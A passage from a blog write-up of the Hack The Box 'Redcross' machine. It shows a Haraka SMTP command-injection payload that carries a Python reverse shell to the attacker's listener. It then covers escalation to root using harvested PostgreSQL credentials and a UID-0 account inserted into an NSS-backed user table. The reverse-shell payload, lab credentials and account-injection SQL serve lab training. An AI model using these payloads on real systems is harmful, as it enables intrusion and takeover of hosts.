</span><span class="gp">Send harariki to penelope@redcross.htb, attachment saved as harakiri-20181111-152151.zip, commandline: python -c 'import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.14.23"</span>,5555<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="s1">' , mailserver redcross is used for delivery
</span><span class="gp">Content-Type: multipart/mixed;</span><span class="w"> </span><span class="s1">boundary="===============2632093882109835759=="
</span><span class="go">MIME-Version: 1.0
Subject: harakiri
From: penelope@redcross.htb
To: penelope@redcross.htb

--===============2632093882109835759==
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">"us-ascii"</span>
<span class="go">MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

harakiri
--===============2632093882109835759==
</span><span class="gp">Content-Type: application/octet-stream;</span><span class="w"> </span><span class="nv">Name</span><span class="o">=</span><span class="s2">"harakiri.zip"</span>
<span class="go">MIME-Version: 1.0
Content-Transfer-Encoding: base64
</span><span class="gp">Content-Disposition: attachment;</span><span class="w"> </span><span class="nv">filename</span><span class="o">=</span><span class="s2">"harakiri.zip"</span>
<span class="go">
UEsDBBQAAAAIALl6a00BtHNYbAEAAI0BAADyAAAAYSI7cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0
LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NL
X1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjMiLDU1NTUpKTtvcy5kdXAyKHMuZmlsZW5v
KCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3Vi
cHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc7ZWNobyAiYS56aXAL8GZmEWFgYOBg2FmV
7Su+rEFdmJGBgZ2ZgYEHKJqRWJSYnVmUqVdSUTI18HRes4HAnt/abo8meZiqyGSIbP2+Kj5g5atE
Zr6yU94blnz4/nTiB66gq1Ml1penXU/Oicw4vKlqj35sQtjuRPeeLr5W05mXLjof98pt6Fz090jS
/mWSky5efTxl986JM3/Nvaq29vBc8Tixz3kGa3X39Ny+OaVy25dPP+Kv7f0ztzffZC8jyz9pp2VC
y6Xkt673/cpy/bC1qupT0zt3/0kGnfILKrWx69y/ILjvpMu2+ceY16/S8eJ1Dva736LCO6VW88Ir
rqnxoX3Tw3d8O2iX8Dk5onnGyesbvSQiQ9rUGH/mrDuidcMsuHWC2yGV5184zs4RdT/OOXvfpyty
r78ct8j/O2lq4JM3e+e282azxgcLaW1QO3YzRCsjKDjnqH6ANyOTCAPu4IOBBkYGtMAM8GZlA4kx
AqEVkLYFqwAAUEsBAhQAFAAAAAgAuXprTQG0c1hsAQAAjQEAAPIAAAAAAAAAAAAAAIABAAAAAGEi
O3B5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChz
b2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjIz
Iiw1NTU1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9z
LmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn
O2VjaG8gImEuemlwUEsFBgAAAAABAAEAIAEAAHwCAAAAAA==
--===============2632093882109835759==--

[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [plugin timeout]
</span><span class="gp">www-data@redcross:/dev/shm$</span><span class="w"> 
</span></code></pre></div></div>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@ragingunicorn:~/hackthebox/Machines/Redcross#</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 5555
<span class="go">listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.113] 33380
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">cat: user.txt: No such file or directory
</span><span class="gp">$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/
</span><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/penelope
<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">ac899b...
</span></code></pre></div></div>

<h3 id="priv-esc-to-root">Priv esc to root</h3>

<p>The NSS plugin is installed, so SSH can authenticate users from the postgresql database instead of <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>nss-pgsql.conf
<span class="go">connectionstring        = hostaddr=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw connect_timeout=1
</span></code></pre></div></div>

<p>We can’t read the other file though…</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>nss-pgsql-root.conf
<span class="go">cat: nss-pgsql-root.conf: Permission denied
</span></code></pre></div></div>

<p>With the credentials we can poke inside the database:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>penelope@redcross:/etc$ psql -h 127.0.0.1 -U unixnss -W unix
psql -h 127.0.0.1 -U unixnss -W unix
Password for user unixnss: fios@ew023xnw

psql (9.6.7)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

unix=&gt; \d
\d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | group_id     | sequence | postgres
 public | group_table  | table    | postgres
 public | passwd_table | table    | postgres
 public | shadow_table | table    | postgres
 public | user_id      | sequence | postgres
 public | usergroups   | table    | postgres
(6 rows)
</code></pre></div></div>

<p>Here we can see the user table in which the user we created resides:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix=&gt; select * from passwd_table;
select * from passwd_table;
 username |               passwd               | uid  | gid  | gecos |    homedir     |   shell   
----------+------------------------------------+------+------+-------+----------------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
 snowscan | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0 | 2020 | 1001 |       | /var/jail/home | /bin/bash
(2 rows)
</code></pre></div></div>

<p>We’ll try adding a new user with password <code class="language-plaintext highlighter-rouge">yolo1234</code> and set it’s UID and GID to 0:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');
ERROR:  permission denied for relation passwd_table
</code></pre></div></div>

<p>Too bad, this user doesn’t have access… But the web application probably has an account that has the correct rights to add users since we were able to create a user from the web interface earlier.</p>

<p>The <code class="language-plaintext highlighter-rouge">/var/www/html/admin/pages/actions.php</code> file contains the credentials we are looking for: <code class="language-plaintext highlighter-rouge">unixusrmgr / dheu%7wjx8B&amp;</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if($action==='adduser'){
	$username=$_POST['username'];
	$passw=generateRandomString();
	$phash=crypt($passw);
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;");
	$result = pg_prepare($dbconn, "q1", "insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
	$result = pg_execute($dbconn, "q1", array($username, $phash));
	echo "Provide this credentials to the user:&lt;br&gt;&lt;br&gt;";
	echo "&lt;b&gt;$username : $passw&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;a href=/?page=users&gt;Continue&lt;/a&gt;";
}
</code></pre></div></div>

<p>Let’s try the same SQL query again with these credentials:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix=&gt; insert into passwd_table (username, passwd, uid, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,0,'/root');
ERROR:  permission denied for relation passwd_table
</code></pre></div></div>

<p>Ugh. Same problem again, let’s try adding a user without setting the UID, but only the GID:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');
ERROR:  duplicate key value violates unique constraint "passwd_table_username_key"
DETAIL:  Key (username)=(snowscan) already exists.
unix=&gt; insert into passwd_table (username, passwd, gid, homedir) values ('snowscan2','$6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1',0,'/root');
INSERT 0 1
unix=&gt; select * from passwd_table;
 username  |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   
-----------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+-----------
 tricia    | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash
 snowscan  | $1$ANxI97CM$noo3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash
 snowscan2 | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UAzEdZxhzd/MbSyjR5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash
(3 rows)
</code></pre></div></div>

<p>Allright, we can log in now, but still don’t have access to read root.txt, we’ll need to have a UID of 0 to do that:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan2@redcross:~$ ls -l
total 12
drwxr-xr-x  3 root root 4096 Jun  6 14:05 bin
drwxrwxr-x 11 root root 4096 Jun  7 17:32 Haraka-2.8.8
-rw-------  1 root root   33 Jun  8 06:51 root.txt
snowscan2@redcross:~$ cat root.txt
cat: root.txt: Permission denied
</code></pre></div></div>

<p>We can now read <code class="language-plaintext highlighter-rouge">nss-pgsql-root.conf</code> since we are part of root’s group and we find more credentials: <code class="language-plaintext highlighter-rouge">unixnssroot / 30jdsklj4d_3</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan2@redcross:/etc$ ls -l nss-pgsql-root.conf
-rw-rw---- 1 root root 540 Jun  8 06:24 nss-pgsql-root.conf
snowscan2@redcross:/etc$ cat nss-pgsql-root.conf
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);
</code></pre></div></div>

<p>Using this account, we are able to create a new user with UID 0:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix=&gt; insert into passwd_table (username, passwd, uid,gid, homedir) values ('snowscan_root','$6$oTkOZvS...',0,0,'/root');
INSERT 0 1
unix=&gt; select * from passwd_table;
   username    |                                               passwd                                               | uid  | gid  | gecos |    homedir     |   shell   
---------------+----------------------------------------------------------------------------------------------------+------+------+-------+----------------+-----------
 tricia        | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp.                                                                 | 2018 | 1001 |       | /var/jail/home | /bin/bash
 snowscan      | $1$ANxI97CM$NZZ3OJtS7FevXzzfR//ih0                                                                 | 2020 | 1001 |       | /var/jail/home | /bin/bash
 snowscan2     | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 | 2022 |    0 |       | /root          | /bin/bash
 snowscan_root | $6$oTkOZvSm$T5279pL/85f822ryylJBp0kHgGRoELCHb4OOBtwmkWWxZ6re/Vlxx6UCzEdZxhzd/MbSy2R5Kp1x4rtNCgHsJ1 |    0 |    0 |       | /root          | /bin/bash
(4 rows)
</code></pre></div></div>

<p>We can’t SSH in with this account because of the SSH server settings:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">snowscan2@redcross:/etc/ssh$</span><span class="w"> </span><span class="nb">grep</span> <span class="nt">-i</span> root sshd_config
<span class="go">PermitRootLogin prohibit-password
</span></code></pre></div></div>

<p>But we can <code class="language-plaintext highlighter-rouge">su</code> to the new user and get the root flag</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">snowscan2@redcross:/etc/ssh$</span><span class="w"> </span>su <span class="nt">-l</span> snowscan_root
<span class="go">Password:

</span><span class="gp">snowscan_root@redcross:~#</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=0(snowscan_root) gid=0(root) groups=0(root)

</span><span class="gp">snowscan_root@redcross:~#</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
<span class="go">892a1f...
</span></code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#command-injection" class="page__taxonomy-item" rel="tag">command injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#cve" class="page__taxonomy-item" rel="tag">cve</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#nss" class="page__taxonomy-item" rel="tag">nss</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pgsql" class="page__taxonomy-item" rel="tag">pgsql</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-04-13T00:00:00+02:00">April 13, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-vault/" class="pagination--pager" title="Vault - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-teacher/" class="pagination--pager" title="Teacher - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
